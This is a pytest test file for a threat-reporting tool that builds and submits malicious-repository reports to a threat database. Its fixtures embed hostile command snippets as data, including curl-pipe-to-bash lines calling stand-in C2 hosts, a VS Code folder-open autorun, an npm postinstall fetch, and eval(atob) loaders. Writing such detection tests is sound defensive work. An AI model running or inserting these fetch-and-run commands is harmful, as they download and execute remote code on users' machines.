"""Tests for the OSM submit-threat reporting path (the write side)."""

from __future__ import annotations

import json

import pytest
from conftest import utcnow

from git_warden.db import Database
from git_warden.enums import DetectionMethod, RepoFindingStatus
from git_warden.models import RepoFinding
from git_warden.osm_submit import (
    build_report,
    gold_for_submission,
    mark_osm_submitted,
    submit_threat,
    unmark_osm_submitted,
)


def _row(**kw) -> dict:
    base = {
        "full_name": "evil/dropper",
        "detection_method": "signature_match",
        "score": 12,
        "reasoning": "Shares a confirmed-malware code signature | Tier-2 confirmed",
        "actor_key": None,
        "first_seen_run": "hunt-20260620T131622Z",
        "last_seen_run": "hunt-20260621T010101Z",
        "raw_payload": json.dumps({"bash_findings": [
            {"file": "postcss.config.js", "line": 12, "category": "obfuscation",
             "rule": "eval-decoded", "snippet": "eval(atob('...'))"}]}),
    }
    base.update(kw)
    return base


def test_build_report_maps_required_and_evidence_fields(monkeypatch):
    # contributor is configurable (GW_OSM_CONTRIBUTOR) so each operator submits
    # under their own OSM identity; blank -> the field is omitted.
    monkeypatch.setattr("git_warden.osm_submit.OSM_CONTRIBUTOR", "my-osm-handle")
    r = build_report(_row())
    assert r["report_type"] == "repository"
    assert r["resource_identifier"] == "https://github.com/evil/dropper"
    assert r["version_info"] == "all"
    assert r["payload_description"]                      # detailed, non-empty
    assert r["contributors"] == ["my-osm-handle"]
    assert r["threat_description"]                       # required, non-empty
    assert r["publisher"] == "evil"
    assert r["severity_level"] == "high"                # obfuscation -> high
    assert "postcss.config.js" in r["threat_description"]      # names the file in prose
    # Tags are campaign-descriptive, and DPRK attribution is GATED: a single
    # tradecraft signal (this lone eval(atob) loader, no infra/decoded
    # corroboration) is 'dprk-consistent-tradecraft', NOT an outright 'dprk' claim.
    assert "supply-chain" in r["tags"] and "obfuscated-eval-atob-loader" in r["tags"]
    assert "dprk-consistent-tradecraft" in r["tags"]
    assert "dprk" not in r["tags"] and "contagious-interview" not in r["tags"]
    assert "signature_match" not in r["tags"]                  # no internal jargon
    assert "Contagious Interview" in r["threat_description"]    # names the campaign tradecraft
    assert r["evidence_references"].endswith("postcss.config.js#L12")


def test_two_signals_assert_dprk_and_emit_evidence_and_domain_reports():
    # 2 independent signals (tradecraft vector + C2-infra overlap) clear the bar,
    # so 'dprk' IS asserted; a single confirming eval(atob) loader whose payload
    # host is known DPRK infra. Also checks multi-evidence packing + domain report.
    from git_warden.actors import attribute
    from git_warden.osm_submit import domain_reports_for

    row = _row(raw_payload=json.dumps({"bash_findings": [
        {"file": "vite.config.js", "line": 3, "category": "obfuscation",
         "rule": "eval-decoded", "snippet": "eval(atob('...'))"},
        {"file": "postinstall.js", "line": 9, "category": "download_exec",
         "rule": "npm-postinstall", "snippet": "fetch('https://coreviewer.vercel.app/x')"}]}))
    infra = {"coreviewer.vercel.app"}                 # seen in a prior DPRK repo
    r = build_report(row, dprk_infra=infra)
    assert "dprk" in r["tags"] and "contagious-interview" in r["tags"]
    # evidence_references packs BOTH confirming file:line links, not just one.
    assert "vite.config.js#L3" in r["evidence_references"]
    assert "postinstall.js#L9" in r["evidence_references"]
    # a linked C2 domain IOC report is emitted for the overlapping attacker host.
    a = attribute(json.loads(row["raw_payload"])["bash_findings"], None, infra)
    dom = domain_reports_for(row, a)
    assert any(d["report_type"] == "domain"
               and d["resource_identifier"] == "coreviewer.vercel.app" for d in dom)


def test_container_threat_gets_docker_tags_but_benign_dockerfile_does_not():
    # A malicious Docker build recipe (external-host fetch-and-run) adds container
    # tags; a benign nodesource install (the FP audit case) does NOT.
    evil = build_report(_row(raw_payload=json.dumps({"bash_findings": [
        {"file": "Dockerfile", "line": 4, "category": "download_exec", "rule": "curl-pipe-shell",
         "snippet": "RUN curl -fsSL https://evil-c2.tld/x | bash"}]})))
    assert "container" in evil["tags"] and "dockerfile" in evil["tags"]
    benign = build_report(_row(raw_payload=json.dumps({"bash_findings": [
        {"file": "Dockerfile", "line": 1, "category": "download_exec", "rule": "curl-pipe-shell",
         "snippet": "RUN curl -fsSL https://deb.nodesource.com/setup_20.x | bash -"}]})))
    assert "container" not in benign["tags"]


def test_report_extracts_c2_and_folderopen_vector():
    r = build_report(_row(raw_payload=json.dumps({"bash_findings": [
        {"file": ".vscode/tasks.json", "line": 0, "category": "install_hook",
         "rule": "vscode-autorun",
         "snippet": "curl https://evil-c2.vercel.app/x | bash"}]})))
    assert "vscode-folderopen-autorun" in r["tags"]
    assert "evil-c2.vercel.app" in r["threat_description"]      # C2 named in the writeup
    assert "folder-open" in r["threat_description"] or "opened in VS Code" in r["threat_description"]


def test_build_report_folds_in_attribution():
    r = build_report(_row(actor_key="DPRK (North Korea) (per OSM)"))
    assert "DPRK" in r["threat_description"]


def test_severity_comes_from_worst_signal_not_score():
    from git_warden.osm_submit import severity_level

    def row(cat):
        return _row(raw_payload=json.dumps({"bash_findings": [
            {"file": "x", "line": 1, "category": cat, "rule": "r"}]}))
    assert severity_level(row("reverse_shell")) == "critical"
    assert severity_level(row("install_hook")) == "critical"
    assert severity_level(row("obfuscation")) == "high"
    assert severity_level(row("persistence")) == "medium"
    assert severity_level(row("enumeration")) == "low"


def test_submit_threat_posts_to_endpoint_with_auth():
    calls = {}

    class FakeHttp:
        def get_text(self, *a, **k):
            return ""

        def post_json(self, url, *, json=None, headers=None):
            calls.update(url=url, json=json, headers=headers)
            return {"threat_id": "abc-123", "status": "pending"}

    resp = submit_threat({"report_type": "repository"}, token="osm_tok", http=FakeHttp())
    assert resp["threat_id"] == "abc-123"
    assert calls["url"].endswith("/submit-threat-report")
    assert calls["headers"]["Authorization"] == "Bearer osm_tok"


def test_submit_threat_requires_a_token(monkeypatch):
    monkeypatch.setattr("git_warden.osm_submit.OSM_API_KEY", None)
    with pytest.raises(RuntimeError):
        submit_threat({}, token=None, http=object())


def test_full_history_gate_catches_old_report_query_latest_misses(monkeypatch):
    """The authoritative novelty gate must flag a repo already in OSM even when it
    is a months-old report (invisible to query-latest's recent window), matching
    on ANY resource_identifier spelling -- the exact gap that caused duplicates."""
    import git_warden.osm_submit as osm

    # OSM stored this repo months ago as scheme+trailing-slash; our submit uses
    # scheme+no-slash, so only a multi-variant search finds it.
    stored = {"id": "6e001ebb-old", "status": "verified",
              "resource_identifier": "https://github.com/hvmgeeks/frontendengine1/"}

    def fake_search(term, *, token=None, http=None):
        return [stored] if term == "https://github.com/hvmgeeks/frontendengine1/" else []

    monkeypatch.setattr(osm, "OSM_API_KEY", "osm_test")
    monkeypatch.setattr(osm, "osm_search", fake_search)

    hit = osm.osm_existing_repo("hvmgeeks/frontendengine1")
    assert hit and hit["id"] == "6e001ebb-old" and hit["status"] == "verified"
    # case-insensitivity: OSM stores POS_backend, we look up pos_backend
    monkeypatch.setattr(osm, "osm_search", lambda term, **k: (
        [{"id": "dae93423", "status": "verified",
          "resource_identifier": "https://github.com/findusman/POS_backend"}]
        if term.rstrip("/").casefold() == "https://github.com/findusman/pos_backend" else []))
    assert osm.osm_existing_repo("findusman/pos_backend")["id"] == "dae93423"
    # a genuinely novel repo is NOT blocked
    monkeypatch.setattr(osm, "osm_search", lambda term, **k: [])
    assert osm.osm_existing_repo("torvalds/linux") is None


def test_evidence_pins_to_commit_sha_when_present():
    """Evidence links must pin to the scanned commit SHA (permanent), falling back
    to HEAD only when no SHA was recorded (older findings)."""
    from git_warden.osm_submit import _evidence_refs
    sha = "a" * 40
    with_sha = _row(raw_payload=json.dumps({
        "commit_sha": sha,
        "bash_findings": [{"file": ".vscode/tasks.json", "line": 3, "rule": "vscode-autorun",
                           "category": "install_hook", "snippet": "curl x | bash"}]}))
    refs = _evidence_refs(with_sha)
    assert f"/blob/{sha}/.vscode/tasks.json#L3" in refs and "/blob/HEAD/" not in refs
    # no SHA recorded -> graceful HEAD fallback
    no_sha = _row(raw_payload=json.dumps({
        "bash_findings": [{"file": "x.js", "line": 1, "rule": "eval-decoded",
                           "category": "obfuscation", "snippet": "eval(atob())"}]}))
    assert "/blob/HEAD/x.js#L1" in _evidence_refs(no_sha)


def test_liveness_recheck_skips_when_payload_removed():
    """repo_payload_live returns False when the evidence file 404s at HEAD, True when
    the distinctive token is still present, None (fail-open) on a transient error."""
    from git_warden.osm_submit import repo_payload_live
    row = _row(full_name="evil/dropper", raw_payload=json.dumps({"bash_findings": [
        {"file": ".vscode/tasks.json", "line": 1, "rule": "vscode-autorun",
         "category": "install_hook",
         "snippet": "curl https://default-configuration.vercel.app/x | bash"}]}))
    live_body = "curl https://default-configuration.vercel.app/x | bash"
    assert repo_payload_live(row, fetch=lambda u: (404, "")) is False
    assert repo_payload_live(row, fetch=lambda u: (200, live_body)) is True
    assert repo_payload_live(row, fetch=lambda u: (200, "clean file, nothing here")) is False
    def boom(u):
        raise OSError("network down")
    assert repo_payload_live(row, fetch=boom) is None


def test_audit_reports_status_and_flags_duplicates(tmp_path, monkeypatch, capsys):
    """--audit reports each submission's OSM status and flags a canonical/ours id
    mismatch as a likely duplicate."""
    import git_warden.osm_submit as osm
    dbp = tmp_path / "a.sqlite"
    db = Database.open(dbp)
    db.start_run("run-1", utcnow())
    _confirmed(db, "good/real", DetectionMethod.SIGNATURE_MATCH)
    _confirmed(db, "dup/repo", DetectionMethod.SIGNATURE_MATCH)
    from git_warden.osm_submit import mark_osm_submitted
    mark_osm_submitted(db, "good/real", "id-ours-1")
    mark_osm_submitted(db, "dup/repo", "id-ours-2")

    def fake_existing(full_name, **k):
        if full_name == "good/real":
            return {"id": "id-ours-1", "status": "verified"}       # canonical == ours -> not a dup
        return {"id": "canonical-9", "status": "false_positive"}   # differs from ours -> DUP
    monkeypatch.setattr(osm, "osm_existing_repo", fake_existing)
    osm.audit(db)
    out = capsys.readouterr().out
    assert "VERIFIED" in out and "FALSE_POSITIVE" in out
    assert "duplicates to decline" in out.lower() or "DUP" in out
    db.close()


def _confirmed(db, name, method):
    db.upsert_finding(RepoFinding(
        full_name=name, detection_method=method, status=RepoFindingStatus.CONFIRMED,
        raw_payload={"bash_findings": [
            {"file": "x.js", "line": 1, "category": "obfuscation", "rule": "eval-decoded"}]}),
        "run-1")


def test_gold_for_submission_gates_on_evidence_not_method(tmp_path):
    # Submittability is gated on OWN intrinsic evidence + novelty, NOT the
    # discovery method (2026-07-02 fix): an owner-pivot repo confirmed on its own
    # injected payload is submittable; only OSM-known, red-team breadcrumbs, and
    # evidence-less association findings are withheld.
    db = Database.open(tmp_path / "s.sqlite")
    db.start_run("run-1", utcnow())
    _confirmed(db, "a/sig", DetectionMethod.SIGNATURE_MATCH)      # novel intrinsic -> IN
    _confirmed(db, "b/owner", DetectionMethod.MALICIOUS_OWNER)    # owner-pivot but has OWN payload -> IN
    _confirmed(db, "c/osm", DetectionMethod.OSM_REPOSITORY)       # OSM already has -> OUT
    _confirmed(db, "d/redteam", DetectionMethod.REDTEAM_LINEAGE)  # breadcrumb, never published -> OUT
    # association-only: confirmed but NO intrinsic bash_findings evidence -> OUT
    db.upsert_finding(RepoFinding(
        full_name="e/assoc-only", detection_method=DetectionMethod.MALICIOUS_OWNER,
        status=RepoFindingStatus.CONFIRMED, raw_payload={}), "run-1")

    assert {r["full_name"] for r in gold_for_submission(db)} == {"a/sig", "b/owner"}

    mark_osm_submitted(db, "a/sig", "tid-1")                      # submitted -> drops out
    assert {r["full_name"] for r in gold_for_submission(db)} == {"b/owner"}
    row = db.get_finding("a/sig")
    assert row["submitted_osm"] == 1 and row["osm_threat_id"] == "tid-1"
    db.close()


def test_corroborated_c2_gate_excludes_singletons_and_shorteners(tmp_path):
    # The FP guard: only a C2 host seen in >= min_repos confirmed repos is submitted
    # as a domain IOC; a one-off host and any URL-shortener are held back.
    from git_warden.osm_submit import corroborated_c2

    db = Database.open(tmp_path / "c.sqlite")
    db.start_run("run-1", utcnow())

    def confirmed(name, host):
        db.upsert_finding(RepoFinding(
            full_name=name, detection_method=DetectionMethod.SIGNATURE_MATCH,
            status=RepoFindingStatus.CONFIRMED, raw_payload={"bash_findings": [
                {"file": "x.js", "line": 1, "category": "download_exec", "rule": "curl-pipe-shell",
                 "snippet": f"curl https://{host}/p | bash"}]}), "run-1")

    confirmed("a/one", "shared-c2.vercel.app")     # seen in 2 repos -> submit
    confirmed("b/two", "shared-c2.vercel.app")
    confirmed("c/three", "lonely-c2.tld")          # 1 repo -> held back
    confirmed("d/four", "evil.short.gy")           # shortener -> never
    confirmed("e/five", "evil.short.gy")

    hosts = {d["host"] for d in corroborated_c2(db, min_repos=2)}
    assert "shared-c2.vercel.app" in hosts
    assert "lonely-c2.tld" not in hosts            # below corroboration threshold
    assert "evil.short.gy" not in hosts            # URL shortener, even at 2 repos
    db.close()


def test_wizard_runs_non_interactive_without_hanging(tmp_path, monkeypatch, capsys):
    # The wizard must NEVER block on input() when there is no TTY (CI, pipes); it
    # should print the whole walkthrough and return cleanly.
    import argparse

    import git_warden.osm_submit as osm
    db = Database.open(tmp_path / "w.sqlite")
    db.start_run("run-1", utcnow())
    _confirmed(db, "a/repo", DetectionMethod.SIGNATURE_MATCH)
    monkeypatch.setattr(osm, "osm_current_reports", lambda *a, **k: {})  # no live OSM
    monkeypatch.setattr(osm, "OSM_API_KEY", "osm_test")                  # pretend key present
    rc = osm.wizard(db, argparse.Namespace(limit=0))
    out = capsys.readouterr().out
    assert rc == 0
    assert "SUBMIT OSM REPORT" in out
    assert "STEP 1 of 4" in out and "STEP 4 of 4" in out
    db.close()


def test_reconcile_classifies_against_osm_state(tmp_path):
    from git_warden.osm_submit import reconcile

    db = Database.open(tmp_path / "rec.sqlite")
    db.start_run("run-1", utcnow())
    for nm in ("a/ours", "b/other", "c/gone"):
        _confirmed(db, nm, DetectionMethod.SIGNATURE_MATCH)
    mark_osm_submitted(db, "a/ours", "id-ours")
    mark_osm_submitted(db, "b/other", "id-mine")
    mark_osm_submitted(db, "c/gone", "id-gone")
    osm_now = {
        "a/ours": {"id": "id-ours", "status": "verified"},      # our id -> ours
        "b/other": {"id": "id-someone-else", "status": "verified"},  # different id
        # c/gone absent -> not in window
    }
    b = reconcile(db, osm_now=osm_now)["buckets"]
    assert [x[0] for x in b["verified_ours"]] == ["a/ours"]
    assert [x[0] for x in b["verified_other"]] == ["b/other"]
    assert [x[0] for x in b["not_in_window"]] == ["c/gone"]
    db.close()


def test_enrich_selects_submitted_repos_with_own_evidence(tmp_path):
    from git_warden.osm_submit import submitted_findings_for_enrich

    db = Database.open(tmp_path / "e.sqlite")
    db.start_run("run-1", utcnow())
    _confirmed(db, "ours/discovered", DetectionMethod.SIGNATURE_MATCH)
    _confirmed(db, "osm/revalidated", DetectionMethod.OSM_REPOSITORY)
    mark_osm_submitted(db, "ours/discovered", "tid-1")
    mark_osm_submitted(db, "osm/revalidated", "tid-2")
    names = {r["full_name"] for r in submitted_findings_for_enrich(db)}
    assert "ours/discovered" in names             # our discovery, submitted -> enrichable
    assert "osm/revalidated" not in names         # OSM's own list -> never
    db.close()


def test_submit_claim_drops_from_queue_release_restores(tmp_path):
    db = Database.open(tmp_path / "s.sqlite")
    db.start_run("run-1", utcnow())
    _confirmed(db, "evil/dropper", DetectionMethod.SIGNATURE_MATCH)
    assert {r["full_name"] for r in gold_for_submission(db)} == {"evil/dropper"}
    # CLAIM (before the POST) removes it from the queue -> no re-select, no duplicate.
    mark_osm_submitted(db, "evil/dropper", None)
    assert gold_for_submission(db) == []
    # RELEASE (POST failed) puts it back -> retried next run.
    unmark_osm_submitted(db, "evil/dropper")
    assert {r["full_name"] for r in gold_for_submission(db)} == {"evil/dropper"}
    db.close()


def test_submit_main_releases_claim_when_post_fails(tmp_path, monkeypatch):
    import git_warden.osm_submit as osm
    dbp = tmp_path / "s.sqlite"
    db = Database.open(dbp)
    db.start_run("run-1", utcnow())
    _confirmed(db, "evil/dropper", DetectionMethod.SIGNATURE_MATCH)
    db.close()

    def boom(*a, **k):
        raise RuntimeError("network down")
    monkeypatch.setattr(osm, "submit_threat", boom)
    monkeypatch.setattr(osm, "osm_current_reports", lambda *a, **k: {})  # no live OSM read
    osm.main(["--confirm", "--db", str(dbp)])

    db = Database.open(dbp)
    row = db.get_finding("evil/dropper")
    assert row["submitted_osm"] == 0          # released -> retryable, never double-sent
    db.close()


def test_submit_main_keeps_claim_when_post_succeeds(tmp_path, monkeypatch):
    import git_warden.osm_submit as osm
    dbp = tmp_path / "s.sqlite"
    db = Database.open(dbp)
    db.start_run("run-1", utcnow())
    _confirmed(db, "evil/dropper", DetectionMethod.SIGNATURE_MATCH)
    db.close()

    monkeypatch.setattr(osm, "submit_threat",
                        lambda *a, **k: {"threat_id": "tid-9", "status": "pending"})
    monkeypatch.setattr(osm, "osm_current_reports", lambda *a, **k: {})  # no live OSM read
    monkeypatch.setattr(osm, "osm_existing_repo", lambda *a, **k: None)  # treat as novel
    monkeypatch.setattr(osm, "repo_payload_live", lambda *a, **k: True)  # skip live fetch
    osm.main(["--confirm", "--db", str(dbp)])

    db = Database.open(dbp)
    row = db.get_finding("evil/dropper")
    assert row["submitted_osm"] == 1 and row["osm_threat_id"] == "tid-9"
    assert gold_for_submission(db) == []      # sent -> never re-selected (no duplicate)
    db.close()
